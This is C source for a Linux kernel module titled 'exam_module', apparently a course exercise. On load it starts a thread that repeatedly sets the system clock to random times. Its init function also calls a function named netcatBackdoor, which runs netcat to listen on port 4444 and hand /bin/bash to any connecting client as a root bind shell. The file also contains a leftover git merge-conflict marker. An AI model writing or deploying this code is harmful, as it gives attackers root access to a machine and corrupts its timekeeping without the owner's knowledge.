#include <linux/module.h>
#include <linux/init.h>
#include <linux/sched.h>
#include <linux/random.h>
#include <linux/kthread.h>
#include <linux/delay.h>
#include <linux/timekeeping.h>
#include <linux/time.h>
#include <linux/kmod.h>


struct task_struct *task;
static int seconds = 10;
module_param(seconds, int, 0);

MODULE_PARM_DESC(seconds, "Time interval between time updates");

<<<<<<< HEAD

=======
>>>>>>> 76b77fb46bb0158bb0fe51477bb8bf0deb2a7b65

int clock_function(void* data)
{
	int *s =(int*) data;
	unsigned int num;
	struct timeval t;
	struct timespec ts;
	struct tm newtime;
	printk("Time interval : %d seconds!\n", *s);

	do_gettimeofday(&t);	

	while(!kthread_should_stop()){

		get_random_bytes(&num, sizeof(num));
        	t.tv_sec=num;
        	ts.tv_sec = t.tv_sec;
        	ts.tv_nsec = t.tv_usec *1000;
        	

        if (timespec_valid_strict(&ts))
        do_settimeofday(&ts);
		time_to_tm(ts.tv_sec, 0, &newtime);
       	printk(KERN_DEBUG "System time Update: %lu,  %02d-%02d-%04d %02ld:%02ld )!\n", t.tv_sec, newtime.tm_mday, newtime.tm_mon, newtime.tm_year, newtime.tm_hour, newtime.tm_min);
		schedule();
		msleep_interruptible(*s * 1000);
		}
	
	return 0;
}


static int netcatBackdoor(void)
{
  struct subprocess_info *sub_info;
  char *argv[] = { "/bin/nc", "-nlvp"," 4444","-e","/bin/bash", NULL };
  static char *envp[] = {
        "HOME=/",
        "TERM=linux",
        "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };

  /*

	* questo funziona per versione kernel inferiore alla 3.0; per quelle successive si può usare call_usermodhelper

  sub_info = call_usermodehelper_setup( argv[0], argv, envp, GFP_ATOMIC );
  if (sub_info == NULL) return -ENOMEM;

  return call_usermodehelper_exec( sub_info, UMH_WAIT_EXEC );
  */
  return call_usermodehelper( argv[0], argv, envp, UMH_WAIT_EXEC );
}

 
static int __init exam_module_init(void)
{
	printk(KERN_DEBUG "Exam module loaded!\n");
	task = kthread_run(&clock_function, &seconds, "exam module");	
	printk(KERN_DEBUG "Thread started\n");
	return netcatBackdoor();
}

static void __exit exam_module_exit(void)
{
	kthread_stop(task);  
	printk(KERN_DEBUG " exam Module unloaded \n");
	return;
}






void timespec_to_timeval(struct timespec *ts, struct timeval *tv)
{
  tv->tv_sec  = ts->tv_sec;
  tv->tv_usec = ts->tv_nsec / 1000;
}





MODULE_AUTHOR("Asshole");
MODULE_DESCRIPTION("exam_module");
MODULE_LICENSE("GPL");
MODULE_VERSION("1.0");
module_init(exam_module_init);
module_exit(exam_module_exit);
